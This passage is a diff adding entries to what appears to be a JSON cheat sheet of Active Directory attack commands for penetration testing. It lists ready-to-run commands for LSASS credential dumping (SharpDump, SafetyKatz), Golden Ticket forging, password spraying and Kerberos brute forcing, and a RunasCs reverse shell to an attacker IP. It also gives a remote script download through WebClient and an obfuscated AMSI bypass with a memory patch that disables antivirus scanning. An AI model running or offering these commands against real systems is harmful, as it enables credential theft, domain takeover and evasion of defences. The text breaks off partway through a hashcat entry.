+      "https://www.ired.team/offensive-security/enumeration-and-discovery/enumerating-windows-domains-using-rpcclient-through-socksproxy-bypassing-command-line-logging"
+    ],
+    "name": "RPCClient-Anonymous"
+  },
+  {
+    "description": "The script FindUncommonShares.py is a Python equivalent of PowerView's Invoke-ShareFinder.ps1 allowing to quickly find uncommon shares in vast Windows Domains.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tAttacker IP: 10.10.10.2\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "python3 FindUncommonShares.py -u 'john' -d 'TEST.local' -p 'password123' --dc-ip 10.10.10.1\n",
+    "items": [
+      "Password",
+      "Username",
+      "Hash"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/p0dalirius/FindUncommonShares"
+    ],
+    "name": "FindUncommonShares"
+  },
+  {
+    "description": "PowerView is a module within PowerSploit written in PowerShell to gain network situational awareness on Windows domains. The below command will query the Domain Controller for a list of members of the Domain Admins group.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tGroup: Domain Admins\n",
+    "command": "Get-DomainGroupMember -identity \"Domain Admins\" -Domain test.local -DomainController 10.10.10.1\n",
+    "items": [
+      "Shell"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon",
+      "https://www.attackdebris.com/?p=470"
+    ],
+    "name": "PowerView-Get-DomainGroupMember"
+  },
+  {
+    "description": "A PowerShell module for exporting, importing, removing, permissioning, publishing Active Directory Certificate Templates. It also includes a DSC resource for creating AD CS templates using these functions. This was built with the intent of using DSC for rapid lab builds, but it could also be used in production environments to move templates between AD CS environments. This command is used for duplicating an excisting \n\nCommand Reference:\n```\nName of new created template: newMaus\n\nName of duplicated template: \"Subordinate Certification Authority\"\n\nIdentity: CODER.HTB\\PKI Admins\n```\n",
+    "command": "New-ADCSTemplate -DisplayName newMaus -JSON (Export-ADCSTemplate -DisplayName \"Subordinate Certification Authority\") -publish -Identity \"CODER.HTB\\PKI Admins\"\n",
+    "code": "The ADCSTemplate module contains the following PowerShell functions:\n\n  Export-ADCSTemplate\n  Get-ADCSTemplate\n  New-ADCSDrive\n  New-ADCSTemplate\n  Remove-ADCSTemplate\n  Set-ADCSTemplateACL\n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      "LDAP",
+      "ADCS"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration",
+      "Exploitation"
+    ],
+    "references": [
+      "https://github.com/GoateePFE/ADCSTemplate"
+    ],
+    "name": "ADCSTemplate"
+  },
+  {
+    "description": "Impacket's GetADUsers.py will attempt to gather data about the domain's users and their corresponding email addresses.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "python3 GetADUsers.py -all test.local/john:password123 -dc-ip 10.10.10.1\n",
+    "items": [
+      "Username",
+      "Password"
+    ],
+    "services": [
+      "Kerberos"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetADUsers.py"
+    ],
+    "name": "Impacket-GetADUsers"
+  },
+  {
+    "description": "Description what the command does and is usefull for.\n\nCommand Reference:\n```\nDomain: arttoolkit.hacker.com\n\nPort: 9001\n\nIP address: 10.10.21.14\n```\n",
+    "command": "put command here\n",
+    "code": "extra code can be placed here. This part is optional and can be removed if not nessasary. \n",
+    "items": [
+      "ITEM"
+    ],
+    "services": [
+      "SERVICE"
+    ],
+    "OS": [
+      "OS"
+    ],
+    "attack_types": [
+      "ATTACK_TYPE"
+    ],
+    "references": [
+      "LINK",
+      "LINK"
+    ],
+    "name": "example"
+  },
+  {
+    "description": "Get-DomainComputer -TrustedToAuth is a PowerView PowerShell command used for Active Directory enumeration. It retrieves computer objects that are trusted for delegation to authenticate to other services, potentially revealing systems susceptible to credential abuse. This command assists in identifying computers with trusted relationships that might be exploited by attackers to gain unauthorized access, making it a crucial tool for assessing security risks in an Active Directory environment.\n",
+    "command": "Get-DomainComputer -Credential $Cred -TrustedToAuth\n",
+    "code": "$Cred = New-Object System.Management.Automation.PSCredential('htb.local\\mmaas', $pass)\n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      "LDAP"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainComputer/",
+      "https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1"
+    ],
+    "name": "PowerView-Get-DomainComputer-Constrained"
+  },
+  {
+    "description": "Smbclient is a tool used to communicate with SMB servers. The following command will connect to an SMB share `C$` using valid credentials.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tSMB Share: C$\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "smbclient \\\\\\\\test.local\\\\C$ -I 10.10.10.1 -U john password123\n",
+    "items": [
+      "Username",
+      "Password"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://www.samba.org/samba/docs/current/man-html/smbclient.1.html",
+      "https://www.madirish.net/59"
+    ],
+    "name": "SMBClient-Enum-Share"
+  },
+  {
+    "description": "SharpUp.exe is part of the GhostPack suite of tools and is a C# port of PowerUp that will perform numerous privilege escalation checks. The following command will run all priv esc checks and store the output in a file.\n\nCommand Reference:\n\n\tOutput File: output.txt\n",
+    "command": "SharpUp.exe > output.txt\n",
+    "items": [
+      "Shell"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "PrivEsc"
+    ],
+    "references": [
+      "https://github.com/GhostPack/SharpUp",
+      "https://www.harmj0y.net/blog/redteaming/ghostpack/"
+    ],
+    "name": "SharpUp"
+  },
+  {
+    "description": "ropnop's kerbrute bruteforces and enumerates valid Active Directory accounts through Kerberos Pre-Authentication. The following command will bruteforce an account against a list of provided passwords given a username.\n\nCommand Reference:\n\n\tDomain: test.local\n\n\tPassword List: passwords.txt\n\n\tUsername: john\n",
+    "command": "kerbrute bruteuser -d test.local passwords.txt john\n",
+    "items": [
+      "Username"
+    ],
+    "services": [
+      "Kerberos"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/ropnop/kerbrute"
+    ],
+    "name": "Kerbrute-BruteUser"
+  },
+  {
+    "description": "SharpWMI.exe is part of the GhostPack suite of tools that provides WMI functionality, such as local/remote WMI queries, remote WMI process creation, and remote execution of arbitrary VBS through WMI events. The following command will simply list all processes running on the local system.\n\nCommand Reference:\n\n\tGet all processes: \"select * from win32_process\"\n",
+    "command": "SharpWMI.exe action=query query=\"select * from win32_process\"\n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      "WMI"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Persistence"
+    ],
+    "references": [
+      "https://github.com/GhostPack/SharpWMI",
+      "https://www.harmj0y.net/blog/redteaming/ghostpack/"
+    ],
+    "name": "SharpWMI"
+  },
+  {
+    "description": "SharpDump.exe is part of the GhostPack suite of tools and is a C# port of PowerSploit's Out-Minidump.ps1. It can dump the process for LSASS or a specific process given it's PID. This dump can then be fed into mimikatz to extract sensitive information. The following command simply dumps the LSASS process.\n",
+    "command": "SharpDump.exe\n",
+    "items": [
+      "Shell"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "PrivEsc",
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/GhostPack/SharpDump",
+      "https://www.harmj0y.net/blog/redteaming/ghostpack/"
+    ],
+    "name": "SharpDump"
+  },
+  {
+    "description": "\"CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks.\" - https://github.com/byt3bl33d3r/CrackMapExec/wiki. This command will enumerate domain groups, local groups, logged on users, relative identifiers (RIDs), sessions, domain users, SMB shares/permissions, and get the domain password policy. You can also use CIDR notation to target a range of ip addresses (i.e. 10.10.10.0/24).\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tUsername: john\n\n\tPassword: password123\n\n\tHash (-H):  807726fcf9f188adc26eeafd7dc16bb7\n",
+    "command": "crackmapexec smb 10.10.10.1 -u 'john' -p 'password123' --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol\n",
+    "items": [
+      "Username",
+      "Password",
+      "Hash"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "references": [
+      "https://github.com/byt3bl33d3r/CrackMapExec",
+      "https://github.com/byt3bl33d3r/CrackMapExec/wiki"
+    ],
+    "name": "Crackmapexec-Enum-SMB"
+  },
+  {
+    "description": "Smbclient is a tool used to communicate with SMB servers. The following command will list out all available shares on the target ip using user John hash on test domain.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tHash: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n",
+    "command": "smbclient -L \\\\10.10.10.1 -U test.local/john --pw-nt-hash XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n",
+    "items": [
+      "Username",
+      "Hash"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://www.samba.org/samba/docs/current/man-html/smbclient.1.html"
+    ],
+    "name": "SMBClient-List-Share-PTH"
+  },
+  {
+    "description": "A new tool for collecting RDP, web and VNC screenshots all in one place\n\nCommand Reference:\n```\nTarget: -t rdp://10.0.0.1\n```\n",
+    "command": "./scrying -t rdp://10.0.0.1\n",
+    "items": [
+      "No_creds"
+    ],
+    "services": [
+      "RDP",
+      "Web"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/nccgroup/scrying"
+    ],
+    "name": "Scrying-rdp"
+  },
+  {
+    "description": "SafetyKatz.exe is part of the GhostPack suite of tools and is a combination of SharpDump and Mimikatz. The following command will dump the LSASS process and run Mimikatz to extract credentials from the dumped process.\n",
+    "command": "SafetyKatz.exe\n",
+    "items": [
+      "Shell"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "PrivEsc",
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/GhostPack/SafetyKatz",
+      "https://www.harmj0y.net/blog/redteaming/ghostpack/"
+    ],
+    "name": "SafetyKatz"
+  },
+  {
+    "description": "PowerView is a module within PowerSploit written in PowerShell to gain network situational awareness on Windows domains. The below command will query the Domain Controller for all ASREPRoastable users.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n",
+    "command": "Get-DomainUser -Domain test.local -DomainController 10.10.10.1 -PreauthNotRequired -Properties SamAccountName\n",
+    "items": [
+      "Shell"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon",
+      "https://www.attackdebris.com/?p=470"
+    ],
+    "name": "PowerView-Get-DomainUser-ASREP"
+  },
+  {
+    "description": "Impacket's dcomexec.py provides an interactive shell on the Windows host similar to wmiexec.py, but using varying DCOM endpoints.\n\nCurrently supports MMC20.Application, ShellWindows, and ShellBrowserWindow DCOM objects.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n\n\tDCOM Object: MMC20\n",
+    "command": "python3 dcomexec.py -object MMC20 test.local/john:password123@10.10.10.1\n",
+    "items": [
+      "Password",
+      "Username"
+    ],
+    "services": [
+      "DCOM"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/dcomexec.py",
+      "https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/"
+    ],
+    "name": "Impacket-DCOMExec"
+  },
+  {
+    "description": "Smbclient is a tool used to communicate with SMB servers. The following command will list out all available shares on the target server using anonymous login.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n",
+    "command": "smbclient -L \\\\test.local -I 10.10.10.1 -N\n",
+    "items": [
+      "No_Creds"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://www.samba.org/samba/docs/current/man-html/smbclient.1.html"
+    ],
+    "name": "SMBClient-List-Shares-Anonymous"
+  },
+  {
+    "description": "Impacket's lookupsid.py performs bruteforcing of Windows SID's to identify users/groups on the remote target.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "python3 lookupsid.py test.local/john:password123@10.10.10.1\n",
+    "items": [
+      "Password",
+      "Username"
+    ],
+    "services": [
+      "RPC"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py",
+      "https://www.puckiestyle.nl/impacket/"
+    ],
+    "name": "Impacket-LookUpSID"
+  },
+  {
+    "description": "Chisel creates encrypted tunnels between computers, allowing secure communication over untrusted networks. Proxychains tunnels traffic through proxies, obfuscating its origin. Together, they offer an added layer of security and privacy. Chisel also allows for port forwarding, forwarding a port on a local machine to a remote one, useful for accessing services on a remote machine that's not directly accessible. This combination of tools can provide flexibility and functionality while ensuring secure and private communication.\n\nCommand Reference:\n```\n8000: port on machine on which the chisel server will be started\n\nserver/client: role which the chisel should take\n\n10.10.21.16: IP address of attacking machine\n\nlocalhost/172.16.22.1: IP address for pointing the port to, localhost for port on victim machine. Or IP address of machine which is one hop further in the network (172.16.22.1, DC).\n\n9050: port on which proxychains is running\n\n```\n",
+    "command": "./chisel_1.8.1_linux_amd64 server -p 8000 --reverse\n",
+    "code": "## /etc/proxychains4.conf\nsocks5  127.0.0.1 9050 \n\n.\\chisel.exe client 10.10.14.16:8000 R:9050:socks (socks proxy for using over 'proxychains' command)\n\n./chisel_1.8.1_linux_amd64 client 10.10.14.16:8000 R:5985:localhost/172.16.22.1:5985 (port forwarding)\n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      "SERVICE"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Persistence",
+      "General"
+    ],
+    "references": [
+      "https://github.com/jpillora/chisel",
+      "https://hack.technoherder.com/chisel/",
+      "https://infinitelogins.com/2020/12/11/tunneling-through-windows-machines-with-chisel/"
+    ],
+    "name": "Chisel-proxychains"
+  },
+  {
+    "description": "Evil-WinRM uses the Windows Management Instrumentation (WMI) to give you an interactive shell on the Windows host.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tUsername: john\n\n\tPassword: password123\n\n\tHash (-H):  807726fcf9f188adc26eeafd7dc16bb7\n",
+    "command": "evil-winrm -i 10.10.10.1 -u john -p password123\n",
+    "items": [
+      "Password",
+      "Username",
+      "Hash"
+    ],
+    "services": [
+      "WMI"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation",
+      "Persistence"
+    ],
+    "references": [
+      "https://github.com/Hackplayers/evil-winrm"
+    ],
+    "name": "Evil-WinRM"
+  },
+  {
+    "description": "PKINIT getnthash.py request a TGS for yourself using Kerberos U2U. This will include with the PAC which in turn contains the NT hash that you can decrypt with the AS-REP key that you got from your TGT request using gettgtpkinit.py from PKINIT. Use the TGT from gettgtpkinit.py in your KRB5CCNAME env variable.\n\nCommand Reference:\n  ```\n  Domain: test.local\n\n  Host that you got the TGT from: DC01\n\n  TGT from gettgtpkinit.py: out.ccache\n\n  AS-REP key: 6e63333c372d7fbe64dab63f36673d0cd03bfb92b2a6c96e70070be7cb07f773\n  ```\n",
+    "command": "KRB5CCNAME=out.ccache python3 getnthash.py test.local/DC01\\$ -key 6e63333c372d7fbe64dab63f36673d0cd03bfb92b2a6c96e70070be7cb07f773\n",
+    "items": [
+      "TGT"
+    ],
+    "services": [
+      "Kerberos"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation",
+      "PrivEsc"
+    ],
+    "references": [
+      "https://github.com/dirkjanm/PKINITtools",
+      "https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/"
+    ],
+    "name": "PKINIT-getnthash"
+  },
+  {
+    "description": "\"CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks.\" - https://github.com/byt3bl33d3r/CrackMapExec/wiki. This command will enumerate the SMB host using anonymous access. \n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n",
+    "command": "crackmapexec smb 10.10.10.1 -u 'a' -p ''\n",
+    "items": [
+      "No_Creds"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "references": [
+      "https://github.com/byt3bl33d3r/CrackMapExec",
+      "https://github.com/byt3bl33d3r/CrackMapExec/wiki"
+    ],
+    "name": "Crackmapexec-Enum-SMB-Anonymous"
+  },
+  {
+    "description": "BloodHound is a single page Javascript web application, built on top of Linkurious, compiled with Electron, with a Neo4j database fed by a data collector. BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Defenders can use BloodHound to identify and eliminate those same attack paths. Both blue and red teams can use BloodHound to easily gain a deeper understanding of privilege relationships in an Active Directory environment.\n\nBloodHound.py is a Python based ingestor for BloodHound, based on Impacket. It allows you to remotely collect data for bloodhound by querying LDAP\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tUsername: john\n\n\tPassword: password123\n\n\tDomain: test.local\n",
+    "command": "bloodhound.py -u john -p password123 -d test.local -v --zip -c All -dc test.local -ns 10.10.10.1\n",
+    "items": [
+      "Username",
+      "Password"
+    ],
+    "services": [
+      "LDAP"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "references": [
+      "https://github.com/BloodHoundAD/BloodHound",
+      "https://github.com/fox-it/BloodHound.py"
+    ],
+    "name": "BloodHound.py-Remote-Ingestion-Creds"
+  },
+  {
+    "description": "RunasCs is an utility to run specific processes with different permissions than the user's current logon provides using explicit credentials. This tool is an improved and open version of windows builtin runas.exe that solves some limitations.\n\nCommand Reference:\n```\nUsername: c.bum\n\nPassword: test123\n\nCommand: Powershell\n\nAttacker IP & port for reverse shell: 10.10.14.19:9003\n```\n",
+    "command": ".\\RunasCs.exe c.bum test123 powershell -r 10.10.14.19:9003\n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      null
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation",
+      "Persistence"
+    ],
+    "references": [
+      "https://github.com/antonioCoco/RunasCs"
+    ],
+    "name": "RunasCs"
+  },
+  {
+    "description": "ropnop's kerbrute bruteforces and enumerates valid Active Directory accounts through Kerberos Pre-Authentication. The following command will attempt to enumerate valid usernames given a list of usernames to try.\n\nCommand Reference:\n\n\tDomain: test.local\n\n\tUsername List: usernames.txt\n",
+    "command": "kerbrute userenum -d test.local usernames.txt\n",
+    "items": [
+      "No_Creds"
+    ],
+    "services": [
+      "Kerberos"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/ropnop/kerbrute"
+    ],
+    "name": "Kerbrute-UserEnum"
+  },
+  {
+    "description": "Get-DomainComputer -Unconstrained is a PowerShell command provided by the PowerView module for Active Directory enumeration. It retrieves computer objects within a domain that have unconstrained delegation enabled, potentially indicating security vulnerabilities. This command helps identify systems that might allow attackers to impersonate users or escalate privileges through unconstrained delegation, which should be investigated and secured promptly. It's a valuable tool for auditing Active Directory environments for potential security risks. \n",
+    "command": "Get-DomainComputer -Credential $Cred -Unconstrained\n",
+    "code": "$Cred = New-Object System.Management.Automation.PSCredential('htb.local\\mmaas', $pass)\n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      "LDAP"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainComputer/",
+      "https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1",
+      "https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/"
+    ],
+    "name": "PowerView-Get-DomainComputer-Unconstrained"
+  },
+  {
+    "description": "One-liner to bypass the AMSI in a Powershell. Manipulating a result variable set by AmsiInitialize can also lead to another AMSI bypass through the amsiInitFailed field. The additional code is Rasta Mouse's memory patch to bypass AMSI, run the one-liner and the additional code to disable AMSI in powershell.\n\nCommand Reference:\n```\nloop the GetTypes method, searching for all types containing the string \u201ciUtils\u201d in its name\n\nGetFields accepts filtering modifiers, we\u2019ll apply the NonPublic and Static filters to help narrow the results\n\nloop through all the fields, searching for a name containing \u201cnitFailed\u201d, as this does not be marked as malicious looking for the amsiContext\n\nset the value to True as this bypasses the AMSI\n```\n",
+    "command": "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like \"*iUtils\") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like \"*nitFailed\") {$f=$e}};$f.setValue($null,$true)\n",
+    "code": "#Rasta-mouses Amsi-Scan-Buffer patch \\n\n$kizax = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class kizax {\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr LoadLibrary(string name);\n    [DllImport(\"kernel32\")]\n    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr yjnqcb, uint flNewProtect, out uint lpflOldProtect);\n}\n\"@\n\nAdd-Type $kizax\n\n$rykogwu = [kizax]::LoadLibrary(\"$(('\u00e0m'+'s\u00ee'+'.d'+'ll').noRMaLiZe([CHAr]([BYte]0x46)+[ChAr]([BYTE]0x6f)+[chAR]([BYTe]0x72)+[Char](109*8/8)+[chaR](68*31/31)) -replace [cHaR](92+76-76)+[cHaR]([byTE]0x70)+[cHar](107+16)+[chAr]([BYtE]0x4d)+[char]([BytE]0x6e)+[cHAr]([byTe]0x7d))\")\n$iyslea = [kizax]::GetProcAddress($rykogwu, \"$(('\u00c3ms\u00eeSc\u00e2n'+'Buffer').normaliZe([ChAr]([bYTe]0x46)+[CHaR]([byte]0x6f)+[chAR]([BYTE]0x72)+[cHar]([byte]0x6d)+[chaR]([byTe]0x44)) -replace [char]([bYTe]0x5c)+[char](112*56/56)+[CHAR](123)+[CHAr](75+2)+[char](94+16)+[ChAR]([ByTE]0x7d))\")\n$p = 0\n[kizax]::VirtualProtect($iyslea, [uint32]5, 0x40, [ref]$p)\n$aapt = \"0xB8\"\n$qkwf = \"0x57\"\n$snxi = \"0x00\"\n$wnan = \"0x07\"\n$nchj = \"0x80\"\n$yywa = \"0xC3\"\n$estof = [Byte[]] ($aapt,$qkwf,$snxi,$wnan,+$nchj,+$yywa)\n[System.Runtime.InteropServices.Marshal]::Copy($estof, 0, $iyslea, 6)\n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      "AV"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Bypassing"
+    ],
+    "references": [
+      "https://gist.github.com/D3Ext/bf57673644ba08e729f65892e0dae6c4"
+    ],
+    "name": "AMSI-Bypass-amsiInitFailed"
+  },
+  {
+    "description": "Command to import Powershell module into the current session. Useful to make use of Powersploit scripts while hacking.\n\nCommand Reference:\n```\nModule: Find-AVSignature.ps1\n```\n",
+    "command": "Import-Module .\\Find-AVSignature.ps1\n",
+    "code": "(New-Object Net.WebClient).DownloadFile('http://172.16.240.178:80/Find-AVSignature.ps1', 'Find-AVSignature.ps1' \n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      "AV",
+      "LDAP"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration",
+      "Exploitation",
+      "Persistence",
+      "PrivEsc",
+      "General",
+      "Injection"
+    ],
+    "references": [
+      "https://powersploit.readthedocs.io/en/latest/",
+      "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/import-module?view=powershell-7.3"
+    ],
+    "name": "Import-Module"
+  },
+  {
+    "description": "Impacket's ticketer.py can perform Golden Ticket attacks, which crafts a valid TGT ticket using a valid user's NTLM hash. It is then possible to access any service using the TGT by requesting a TGS for that service.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tHash: b18b4b218eccad1c223306ea1916885f\n\n\tDomain SID: S-1-5-21-1339291983-1349129144-367733775\n",
+    "command": "python3 ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain test.local -dc-ip 10.10.10.1 john\n",
+    "items": [
+      "Username",
+      "Hash"
+    ],
+    "services": [
+      "Kerberos"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation",
+      "Persistence"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py",
+      "https://www.tarlogic.com/en/blog/how-to-attack-kerberos/"
+    ],
+    "name": "Impacket-GoldenTicket"
+  },
+  {
+    "description": "\"CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks.\" - https://github.com/byt3bl33d3r/CrackMapExec/wiki. This command will perform password/user spraying over SMB against the domain controller.\n\nCommand Reference:\n\n\tDomain Controller IP: 10.10.10.1\n\n\tUsername List: users.txt\n\n\tPassword: password123 /password.txt\n",
+    "command": "crackmapexec smb 10.10.10.1 -u users.txt -p password123\n",
+    "items": [
+      "Username",
+      "Password"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "attack_types": [
+      "Exploitation",
+      "Enumeration"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "references": [
+      "https://github.com/byt3bl33d3r/CrackMapExec",
+      "https://github.com/byt3bl33d3r/CrackMapExec/wiki"
+    ],
+    "name": "Crackmapexec-SMB-Password-Spray"
+  },
+  {
+    "description": "Aquatone is a tool for visual inspection of websites across a large amount of hosts and is convenient for quickly gaining an overview of HTTP-based attack surface.\n\nCommand Reference:\n```\nList with IP address to enumerate: all-ips.txt\n\nPorts, if you want uncommon: -ports \"10080,1080,2030,2443,9025,9090,9800,9801\"\n\nLocation of Chromium: C:\\Users\\test1\\AppData\\Local\\Chromium\\Application\\chrome.exe\n```\n",
+    "command": "cat .\\all-ips.txt | .\\aquatone.exe -chrome-path C:\\Users\\test1\\AppData\\Local\\Chromium\\Application\\chrome.exe -out all-ip\n",
+    "code": "To avoid errors with making screenshots on Windows, make sure to put the Aquatone executable in the same folder as the Chromium executable. \n",
+    "items": [
+      "No_creds"
+    ],
+    "services": [
+      "Web"
+    ],
+    "OS": [
+      "Windows",
+      "Linux"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/michenriksen/aquatone"
+    ],
+    "name": "Aquatone"
+  },
+  {
+    "description": "The \"RunAs\" function in PowerShell is used to run a specific command or script as a different user. This can be particularly useful when you need to execute commands or scripts with elevated privileges or within a different security context. When dealing with multiple domains, especially in an Active Directory environment, executing commands in a different domain requires careful consideration due to security boundaries. Which can be usefull to execute commands as a domain user on a non domain PC.\n\nCommand Reference:\n```\nUsername: mmaas\n\nDomain: domain.local\n\nCommand: powershell_ise.exe\n\n/netonly allows you to open a new process with alternative credentials\n```\n",
+    "command": "runas /netonly /user:domain.local\\mmaas powershell_ise.exe\n",
+    "items": [
+      "Shell",
+      "Username",
+      "Password"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Persistence"
+    ],
+    "references": [
+      "https://counihan.co.za/blog/Using-RunAs-from-PowerShell/"
+    ],
+    "name": "RunasDomainUser"
+  },
+  {
+    "description": "The command hashcat is a password recovery tool that allows for the cracking of various types of password hashes. The goal of the command is to attempt to crack the password hash (Kerberos) using a list of common passwords from the rockyou wordlist.\n\nCommand Reference:\n```\nMode: 18200 (Kerberos 5 AS-REP etype 23)\n\nTGT hash: user.kerb\n\nWordlist: /usr/share/wordlists/rockyou.txt\n```\n",
+    "command": "hashcat -m 18200 user.kerb /usr/share/wordlists/rockyou.txt\n",
